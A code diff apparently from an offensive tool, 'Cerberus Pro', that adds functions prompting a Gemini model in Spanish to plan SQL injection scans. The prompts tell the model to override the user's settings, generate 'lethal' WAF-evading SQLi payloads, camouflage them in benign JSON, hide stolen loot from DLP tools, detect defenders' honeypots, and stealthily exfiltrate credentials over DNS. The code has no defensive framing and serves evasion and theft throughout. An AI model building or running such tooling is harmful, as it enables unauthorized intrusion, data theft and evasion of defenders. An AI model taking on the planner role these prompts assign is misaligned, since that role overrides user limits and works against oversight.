@@ -39,8 +39,8 @@ def _get_client():
         return None
 
 
-CORTEX_MODEL = "gemini-2.0-flash"
-CORTEX_TIMEOUT = 3.0  # seconds
+CORTEX_MODEL = "gemini-3-flash-preview"
+CORTEX_TIMEOUT = 5.0  # seconds
 
 
 # ---------------------------------------------------------------------------
@@ -73,10 +73,193 @@ class CorrelatedFindings:
     source: str = "heuristic"
 
 
+@dataclass
+class TacticalSetup:
+    level: int = 1
+    risk: int = 1
+    threads: int = 3
+    tamper: str = "space2comment,randomcase"
+    delay: int = 0
+    technique: str = "BEUSTQ"
+    reasoning: str = ""
+    source: str = "heuristic"
+
+
 # ---------------------------------------------------------------------------
 # Core AI functions
 # ---------------------------------------------------------------------------
 
+async def generate_initial_tactics(target_url: str, mode: str, user_cfg: dict) -> TacticalSetup:
+    """
+    Given a target and context, the AI decides the optimal initial aggressiveness and evasion.
+    Allows Cortex AI to have "sovereignty" over manual configurations (except Tor/Proxy).
+    """
+    client = _get_client()
+    if client is None:
+        return _heuristic_initial_tactics(target_url, mode)
+
+    prompt = f"""Eres el planificador táctico de Cerberus Pro.
+Determina la configuración de escaneo INICIAL ÓPTIMA para el siguiente objetivo.
+Ignora las configuraciones manuales inseguras del usuario; tú tienes SOBERANÍA TÁCTICA.
+
+OBJETIVO:
+- URL: {target_url}
+- Entorno/Modo: {mode}
+- User Config Context (Solo referencia): {json.dumps(user_cfg.get('sqlMap', {}))}
+
+RESPONDE SOLO EN JSON VÁLIDO CON LOS SIGUIENTES CAMPOS:
+{{
+    "level": (entero 1 al 5. URLs dudosas o complejas = 3+. Standard = 2),
+    "risk": (entero 1 al 3. 1 es seguro, 3 puede alterar DB. Usa 1 o 2),
+    "threads": (entero 1 al 10. Usa 2-3 para evitar baneos rápidos por IPS),
+    "tamper": (string separado por comas, ej. "between,randomcase,space2comment,charencode". Varía según si crees que hay WAF),
+    "delay": (entero en segundos, ej 0, 1 o 2. Si sospechas WAF o IPS estricto, pon 2),
+    "technique": (letras BEUSTQ. Quita opciones letales si es muy frágil),
+    "reasoning": "explicación breve en español sobre por qué escogiste este perfil"
+}}"""
+
+    try:
+        response = await asyncio.wait_for(
+            asyncio.get_event_loop().run_in_executor(
+                None,
+                lambda: client.models.generate_content(
+                    model=CORTEX_MODEL, contents=prompt
+                ),
+            ),
+            timeout=CORTEX_TIMEOUT,
+        )
+        text = response.text.strip()
+        if text.startswith("```"):
+            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
+            if text.endswith("```"):
+                text = text[:-3]
+            text = text.strip()
+
+        data = json.loads(text)
+        return TacticalSetup(
+            level=int(data.get("level", 2)),
+            risk=int(data.get("risk", 1)),
+            threads=int(data.get("threads", 3)),
+            tamper=str(data.get("tamper", "space2comment")),
+            delay=int(data.get("delay", 0)),
+            technique=str(data.get("technique", "BEUSTQ")),
+            reasoning=str(data.get("reasoning", "")),
+            source="gemini"
+        )
+    except Exception as e:
+        logger.warning(f"Cortex initial tactics fallback: {e}")
+        return _heuristic_initial_tactics(target_url, mode)
+
+def _heuristic_initial_tactics(target_url: str, mode: str) -> TacticalSetup:
+    """Fallback if AI is unavailable."""
+    setup = TacticalSetup(source="heuristic")
+    if "api" in target_url.lower() or mode == "api":
+        setup.level = 3
+        setup.risk = 1
+        setup.tamper = "between,randomcase,base64encode"
+        setup.reasoning = "API target detected, increased level and JSON-safe tampers."
+    elif ".gov" in target_url.lower() or ".edu" in target_url.lower():
+        setup.level = 2
+        setup.delay = 3
+        setup.threads = 1
+        setup.tamper = "apostrophemask,space2comment"
+        setup.reasoning = "High-security domain detected, slowing down scan and reducing threads."
+    else:
+        setup.level = 2
+        setup.risk = 1
+        setup.threads = 3
+        setup.tamper = "space2comment,randomcase"
+        setup.reasoning = "Standard heuristic fallback based on target domain."
+
+    return setup
+
+# ---------------------------------------------------------------------------
+# AI Response Oracle (Phase 15)
+# ---------------------------------------------------------------------------
+
+async def analyze_injection_response(
+    baseline_content: str, 
+    true_content: str, 
+    false_content: str, 
+    vector_type: str = "Boolean"
+) -> Dict[str, Any]:
+    """
+    Oráculo Híbrido: Analiza profundamente peticiones ambiguas (Zona Gris) donde las
+    matemáticas de difflib fallan por contenido dinámico o barreras proxy.
+    Recibe los cuerpos de texto y le pide a Gemini que determine si el diferencial
+    responde a inyección SQL o a mero ruido web.
+    """
+    client = _get_client()
+    if client is None:
+        logger.warning("AI disabled. Oráculo fallback: Inconclusivo")
+        return {"status": "inconclusive", "confidence": 0.0, "reasoning": "AI Unavailable"}
+
+    # Recortar contenidos gigantescos para ahorrar tokens / no colapsar la ventana de contexto
+    def snip(text, max_len=2000):
+        if not text: return ""
+        return text if len(text) < max_len else text[:max_len//2] + "\n...[SNIPPED]...\n" + text[-max_len//2:]
+
+    prompt = f"""Eres el 'Oráculo de Inyecciones' de Cerberus Pro (Fase 15).
+Tu trabajo es ser Juez de Última Instancia sobre una petición que la heurística determinó 'Ambiguamente Vulnerable' (Zona Gris).
+
+Tipo de Vector Analizado: {vector_type}
+
+A continuación tienes extractos del cuerpo de la respuesta HTTP. 
+1. BASELINE (La página original sin inyección):
+```text
+{snip(baseline_content)}
+```
+
+2. TRUE PAYLOAD (La página cuando inyectamos AND 1=1):
+```text
+{snip(true_content)}
+```
+
+3. FALSE PAYLOAD (La página cuando inyectamos AND 1=2):
+```text
+{snip(false_content)}
+```
+
+Analiza la semántica textual y estructural de las tres respuestas. 
+¿La diferencia entre TRUE y FALSE sugiere que el backend en realidad procesó la inyección SQL, o las diferencias son meras fluctuaciones (como IDs de sesión, timestamps o rotación de anuncios)?
+
+RESPONDE SOLO EN JSON VÁLIDO CON LOS SIGUIENTES CAMPOS:
+{{
+    "status": "vulnerable" | "safe" | "inconclusive",
+    "confidence": (float entre 0.0 y 1.0),
+    "reasoning": "Tu explicación analítica del diferencial en español, nombrando el fragmento de código que delata el fallo o aclara que es ruido."
+}}"""
+
+    try:
+        response = await asyncio.wait_for(
+            asyncio.get_event_loop().run_in_executor(
+                None,
+                lambda: client.models.generate_content(
+                    model=CORTEX_MODEL, contents=prompt
+                ),
+            ),
+            timeout=10.0, # Oráculo tiene tiempo extra por lectura contextual
+        )
+        text = response.text.strip()
+        if text.startswith("```"):
+            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
+            if text.endswith("```"):
+                text = text[:-3]
+            text = text.strip()
+
+        data = json.loads(text)
+        return {
+            "status": data.get("status", "inconclusive"),
+            "confidence": float(data.get("confidence", 0.0)),
+            "reasoning": str(data.get("reasoning", "Fallo al decodificar razonamiento AI"))
+        }
+
+    except asyncio.TimeoutError:
+        logger.warning("Cortex AI Oráculo Timeout (>10s).")
+        return {"status": "inconclusive", "confidence": 0.0, "reasoning": "Timeout"}
+    except Exception as e:
+        logger.error(f"Error procesando oráculo AI: {e}")
+        return {"status": "inconclusive", "confidence": 0.0, "reasoning": str(e)}
 async def analyze_waf_signal(
     signal_data: Dict[str, Any],
     scan_context: Dict[str, Any],
@@ -306,6 +489,126 @@ El resumen debe ser:
         logger.warning(f"Cortex narrative fallback: {e}")
         return _heuristic_narrative(verdict_status, findings, coverage_pct)
 
+async def generate_smart_payloads(
+    context: Dict[str, Any],
+    error_trace: str,
+    target_count: int = 5
+) -> List[str]:
+    """
+    Generate context-aware, polyglot payloads by analyzing error traces and backend responses.
+    """
+    client = _get_client()
+    if client is None:
+        return []
+
+    prompt = f"""Eres un Ingeniero Inverso de Exploits y Pentester Experto operando dentro del motor Cerberus.
+Tu objetivo es analizar un error del servidor o un contexto y generar payloads SQLi políglotas exactos, capaces de burlar el parser específico del backend.
+
+CONTEXTO DEL SISTEMA RECOLECTADO:
+- Vector/Tipo: {context.get('vector', 'Desconocido')}
+- URL/Endpoint: {context.get('url', 'Desconocido')}
+- Parámetro Target: {context.get('parameter', 'Desconocido')}
+- DB Detectada: {context.get('dbms', 'Auto')}
+- Plataforma/OS Detectado: {context.get('os', 'Auto')}
+
+TRACE DE ERROR DEL RESPONSABLE (MÁS IMPORTANTE):
+{error_trace[:2000] if error_trace else "No error trace available. Use context to guess."}
+
+INSTRUCCIONES:
+1. Analiza qué lenguaje, ORM o base de datos generó el error (ej. Hibernate, MySQL, Python traceback).
+2. Genera exactamente {target_count} payloads altamente específicos diseñados para explotar este entorno. Usa comentarios `/**/`, variables anidadas o técnicas avanzadas según el error.
+3. No des explicaciones, devuelve únicamente un JSON válido con la siguiente estructura estricta:
+
+{{
+    "payloads": ["payload1", "payload2", "payload3"]
+}}"""
+
+    try:
+        response = await asyncio.wait_for(
+            asyncio.get_event_loop().run_in_executor(
+                None,
+                lambda: client.models.generate_content(
+                    model=CORTEX_MODEL, contents=prompt
+                ),
+            ),
+            timeout=CORTEX_TIMEOUT * 1.5,  # Slightly longer timeout for complex payload generation
+        )
+        text = response.text.strip()
+        if text.startswith("```"):
+            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
+            if text.endswith("```"):
+                text = text[:-3]
+            text = text.strip()
+
+        data = json.loads(text)
+        return data.get("payloads", [])
+    except Exception as e:
+        logger.warning(f"Cortex smart payload generation failed: {e}")
+        return []
+
+async def generate_semantic_camouflage(
+    raw_payload: str,
+    endpoint_context: Dict[str, Any],
+    format_type: str = "json"
+) -> Optional[str]:
+    """
+    [P5-B] Generates a benign-looking business structure (e.g. JSON) that stealthily embeds 
+    the malicious payload, evading traditional signature-based WAFs via behavioral mimicry.
+    """
+    client = _get_client()
+    if client is None:
+        return None
+
+    prompt = f"""Eres una IA Especialista en Evasión Semántica y Red Teaming avanzado.
+Tu objetivo es camuflar un payload SQLi agresivo dentro de una estructura de datos aparentemente inofensiva y legítima, para burlar firewalls aplicativos (WAFs) basados en firmas heurísticas que ignoran valores dentro de grandes conjuntos JSON.
+
+PAYLOAD A ESCONDER:
+{raw_payload}
+
+CONTEXTO DEL OBJETIVO:
+- Target Endpoint: {endpoint_context.get('url', 'Desconocido')}
+- Método Habitual: POST/PUT
+- Parámetro Objetivo (donde debería ejecutar el SQLi): {endpoint_context.get('parameter', 'id')}
+
+INSTRUCCIONES:
+1. Diseña un documento {format_type.upper()} que simule ser válido y habitual para un entorno de negocio moderno (ej. un registro de usuario complejo, configuración de perfil, logging, etc.).
+2. El documento debe contener al menos 4-5 campos legítimos como 'email', 'status', 'preferences', 'user_agent' o similares.
+3. Inyecta el PAYLOAD A ESCONDER de forma EXACTA e INTACTA (no escapes las comillas del payload) dentro de uno de los valores del JSON, preferiblemente en un campo que parezca de texto largo, pero asócialo lógicamente a la key indicada en el Parámetro Objetivo si tiene sentido.
+4. Tu respuesta final debe ser EXCLUSIVAMENTE el string {format_type.upper()} validado y parseable. Sin explicaciones ni delimitadores markdown.
+
+Ejemplo de salida de éxito esperada:
+{{
+  "user_email": "admin@empresa.com",
+  "preferences": {{ "theme": "dark", "notifications": true }},
+  "{endpoint_context.get('parameter', 'id')}": "{raw_payload}",
+  "session_token": "a1b2c3d4e5f6g7h8i9j0"
+}}
+"""
+    try:
+        response = await asyncio.wait_for(
+            asyncio.get_event_loop().run_in_executor(
+                None,
+                lambda: client.models.generate_content(
+                    model=CORTEX_MODEL, contents=prompt
+                ),
+            ),
+            timeout=CORTEX_TIMEOUT * 1.5,
+        )
+        text = response.text.strip()
+        if text.startswith("```"):
+            text = text.split("\n", 1)[1] if "\n" in text else text[3:]
+            if text.endswith("```"):
+                text = text[:-3]
+            text = text.strip()
+
+        # Validate it is parseable JSON
+        json.loads(text)
+        return text
+    except Exception as e:
+        logger.warning(f"Cortex semantic camouflage generation failed: {e}")
+        return None
+
+
 
 # ---------------------------------------------------------------------------
 # Structured Finding Parser
@@ -478,3 +781,232 @@ def _heuristic_narrative(
         f"Existen bloqueadores que impidieron completar la evaluación.\n\n"
         f"**Recomendación**: Resolver bloqueadores y re-ejecutar con cobertura completa."
     )
+
+
+async def hide_in_plain_sight(loot: str, theme: str = "customer_review") -> Optional[str]:
+    """
+    [P5-C Data Steganography]
+    Uses Generative AI to hide extracted data inside innocent-looking text.
+    """
+    client = _get_client()
+    if client is None:
+        logger.warning("Cortex AI not available for Steganography.")
+        return None
+        
+    prompt = f"""Eres el módulo de Esteganografía Generativa del sistema Cerberus.
+Tu objetivo es ocultar información de forma que pase desapercibida ante herramientas DLP (Data Loss Prevention) y firewalls.
+
+TEMA REQUERIDO: Escribe un texto coherente y legítimo sobre: {theme} (ej. una reseña de producto, un ticket de soporte, un email corporativo).
+
+LOOT A OCULTAR (Cadena en JSON/Base64):
+{loot}
+
+Instrucciones de incrustación:
+Puedes inyectar esta cadena literal dentro de un campo como "Tracking ID", "Diagnostic Data", "Session Token" o cualquier patrón que encaje naturalmente con el {theme}.
+Asegúrate de que la cadena se inserte INTACTA para facilitar su extracción mediante expresiones regulares.
+
+Restricciones:
+- No menciones que estás ocultando algo.
+- El texto debe parecer 100% natural, escrito por un humano.
+- Devuelve SOLAMENTE el texto generado con la información oculta. No agregues explicaciones."""
+
+    try:
+        response = await asyncio.to_thread(
+            client.models.generate_content,
+            model=CORTEX_MODEL,
+            contents=prompt,
+        )
+        return response.text.strip()
+    except Exception as e:
+        logger.error(f"Cortex steganography generation failed: {e}")
+        return None
+
+async def evaluate_node_safety(node_url: str, latency_history: list, block_rate: float) -> dict:
+    """
+    [P5-D Active Threat Intel]
+    Uses Generative AI to evaluate if a proxy/Tor node is likely a honeypot or tarpit.
+    Returns JSON with {"is_safe": bool, "confidence": float, "reasoning": str}
+    """
+    client = _get_client()
+    if client is None:
+        logger.warning(f"Cortex AI not available. Heuristically marking node {node_url} as safe.")
+        return {"is_safe": True, "confidence": 0.5, "reasoning": "Heurística pasiva (IA inactiva)"}
+        
+    prompt = f"""Eres el Analista de Ciberinteligencia de Amenazas Activas de Cerberus.
+Tu objetivo es analizar telemetría de red y determinar si un nodo proxy/Tor es un Honeypot del Blue Team, un Tarpit diseñado para gastar nuestros recursos, o un nodo de salida legítimo.
+
+DATOS DEL NODO:
+- URL del Nodo: {node_url}
+- Historial de Latencias (últimos pings en ms): {latency_history}
+- Tasa de Bloqueos (Block Rate): {block_rate:.0%}
+
+Reglas Heurísticas sugeridas:
+1. Una latencia que oscila matemáticamente de forma perfecta sugiere un Tarpit sintético.
+2. Un ratio de bloqueos del 100% permanente con tiempos de respuesta anómalamente bajos sugiere redirección a sumidero DNS.
+3. Latencias erráticas o altas pero orgánicas suelen indicar un proxy público saturado legítimo.
+
+Requisitos de Salida:
+Devuelve EXCLUSIVAMENTE un bloque JSON válido con el siguiente esquema:
+{{
+    "is_safe": boolean,
+    "confidence": float (0.0 a 1.0),
+    "reasoning": "Descripción técnica concisa del por qué de la decisión"
+}}
+NO agregues markdown genérico de bloque de código, devuelve sólo el string JSON puro."""
+
+    try:
+        response = await asyncio.to_thread(
+            client.models.generate_content,
+            model=CORTEX_MODEL,
+            contents=prompt,
+        )
+        # Parse the JSON response
+        text = response.text.replace('```json', '').replace('```', '').strip()
+        data = json.loads(text)
+        return {
+            "is_safe": bool(data.get("is_safe", True)),
+            "confidence": float(data.get("confidence", 0.5)),
+            "reasoning": str(data.get("reasoning", "No valid reasoning provided."))
+        }
+    except Exception as e:
+        logger.error(f"Cortex threat intel evaluation failed for node {node_url}: {e}")
+async def generate_lethal_payload(
+    target_url: str,
+    tech_stack: Dict[str, str],
+    error_feedback: Optional[str] = None,
+    waf_signals: List[str] = None,
+    risk_level: int = 1
+) -> Dict[str, Any]:
+    """
+    [P5-E Lethal Payload Generation - V2 Predatory]
+    Uses Gemini 3 to create context-aware, predatory SQL injection payloads.
+    Directly incorporates OOB (Out-of-Band) and advanced WAF bypass techniques.
+    """
+    client = _get_client()
+    if client is None:
+        return {
+            "payload": "' OR 1=1 --",
+            "reasoning": "Heurística básica (IA inactiva)",
+            "confidence": 0.1,
+            "is_lethal": False
+        }
+
+    prompt = f"""Eres el Maestro de Armas Ofensivo de Cerberus (Nivel 5).
+Tu objetivo es generar una carga útil (PAYLOAD) letal, quirúrgica y contextualmente perfecta.
+
+DATOS DEL OBJETIVO:
+- URL: {target_url}
+- Stack Tecnológico: {json.dumps(tech_stack)}
+- Feedback de Errores: {error_feedback or "Ciego (Sin errores directos)"}
+- Señales de WAF detectadas: {", ".join(waf_signals or ["Ninguna"])}
+- Nivel de Riesgo (1-3): {risk_level}
+
+DIRECTIVAS DE LETALIDAD Y EVASIÓN AVANZADA (Cloudflare/IPS):
+1. **Dialecto Específico**: Si el stack es PHP/MySQL, usa `HEX()`, `UNHEX()`, y `ELT()` para fragmentar datos. No uses `LOAD_FILE` si Cloudflare detecta rutas UNC/Windows.
+2. **Bypass de Firmas L7**:
+   - Evita palabras clave como `UNION`, `SELECT`, `WHERE`. Sustitúyelas por variaciones de caja (`uNiOn`), caracteres nulos (`%00`), o comentarios en línea (`/*!50000SELECT*/`).
+   - Usa sustitutos lógicos: `INSTR('abc','a')` en lugar de `LIKE`, o `ABS(1)` para comparaciones booleanas.
+3. **Ofuscación de Tráfico**: Cloudflare analiza la estructura del payload. Usa caracteres de control (`%09`, `%0a`, `%0d`) y espacios alternativos (`%A0`, `/**/`) para romper la detección basada en RegEx.
+4. **Behavioral Masking**: Si se detecta Cloudflare, genera payloads que parezcan peticiones legítimas (ej: parámetros de búsqueda complejos o JSON strings).
+5. **Predación Sigilosa**: Prefiere técnicas de error-based ciegas o de tiempo con jitter, ya que las UNION son muy ruidosas para Cloudflare.
+
+REGLAS DE RESPUESTA:
+- Devuelve EXCLUSIVAMENTE un bloque JSON puro.
+- NO incluyas introducciones ni explicaciones fuera del JSON.
+- Asegúrate de que el JSON sea válido.
+
+ESQUEMA JSON:
+{{
+    "payload": "la cadena de inyección exacta para bypass",
+    "reasoning": "táctica específica para burlar el WAF detectado",
+    "confidence": float (0.0 a 1.0),
+    "is_lethal": boolean
+}}"""
+
+    try:
+        response = await asyncio.to_thread(
+            client.models.generate_content,
+            model=CORTEX_MODEL,
+            contents=prompt,
+        )
+        
+        # Robust JSON extraction
+        raw_text = response.text.strip()
+        # Find first '{' and last '}'
+        start = raw_text.find('{')
+        end = raw_text.rfind('}')
+        if start != -1 and end != -1:
+            raw_text = raw_text[start:end+1]
+        
+        data = json.loads(raw_text)
+        return {
+            "payload": str(data.get("payload", "' OR 1=1 --")),
+            "reasoning": str(data.get("reasoning", "Cortex AI Lethal Engine.")),
+            "confidence": float(data.get("confidence", 0.5)),
+            "is_lethal": bool(data.get("is_lethal", False))
+        }
+    except Exception as e:
+        logger.error(f"Cortex lethal payload generation failed: {e}")
+        return {
+            "payload": "' OR 1=1 --",
+            "reasoning": f"Fallo al generar con IA: {e}",
+            "confidence": 0.2,
+            "is_lethal": False
+        }
+
+
+async def generate_extraction_payload(
+    target_url: str,
+    tech_stack: Dict[str, str],
+    extraction_target: str = "current_user",
+    waf_signals: List[str] = None
+) -> Dict[str, Any]:
+    """
+    [P5-E Intelligent Data Extraction - V2]
+    Generates payloads for high-value data exfiltration (creds, schema, roles).
+    Enforces stealth and tunnel integrity design.
+    """
+    client = _get_client()
+    if client is None:
+        return {"payload": "SELECT user()", "reasoning": "Heurística básica."}
+
+    prompt = f"""Eres el Fantasma de Exfiltración de Cerberus (Nivel 5).
+Tu objetivo es extraer datos de ALTO VALOR de forma SIGILOSA e INTELIGENTE.
+
+DATOS DEL OBJETIVO:
+- URL: {target_url}
+- Stack: {json.dumps(tech_stack)}
+- WAF/Defensas: {", ".join(waf_signals or ["Evasión estándar"])}
+- Objetivo Específico: {extraction_target}
+
+DIRECTIVAS DE OPERACIÓN FANTASMA:
+1. **Detección Cero**: El payload debe parecer una anomalía de red o un error de lógica de la aplicación, NO un ataque.
+2. **Encapsulamiento**: Usa `HEX()` o `CHAR()` anidados para que el dato exfiltrado no sea legible en tránsito por firewalls de capa 7.
+3. **Fragmentación Sigilosa**: Si usas OOB/DNS, divide el dato en piezas de 15-20 caracteres para evitar sospechas por nombres de dominio inusualmente largos.
+4. **Validación de Integridad**: Añade un checksum corto (ej: los primeros 4 bytes del hash del dato) al final de la cadena exfiltrada para que Cerberus pueda validar que el dato llegó íntegro.
+5. **Auto-Limpieza**: No uses tablas temporales si es posible. Si debes usarlas, el payload debe incluir el comando `DROP` o `DELETE` condicionado al final de la ejecución.
+
+REGLAS DE RESPUESTA:
+- Devuelve EXCLUSIVAMENTE un bloque JSON puro.
+{{
+    "payload": "la cadena de extracción quirúrgica",
+    "reasoning": "táctica defensiva-sigilosa utilizada",
+    "is_high_value": boolean
+}}"""
+
+    try:
+        response = await asyncio.to_thread(
+            client.models.generate_content,
+            model=CORTEX_MODEL,
+            contents=prompt,
+        )
+        raw_text = response.text.strip()
+        start = raw_text.find('{')
+        end = raw_text.rfind('}')
+        if start != -1 and end != -1:
+            raw_text = raw_text[start:end+1]
+        data = json.loads(raw_text)
+        return data
+    except Exception as e:
+        logger.error(f"Cortex extraction payload generation failed: {e}")
+        return {"payload": "SELECT user()", "reasoning": "Fallo en IA.", "is_high_value": False}
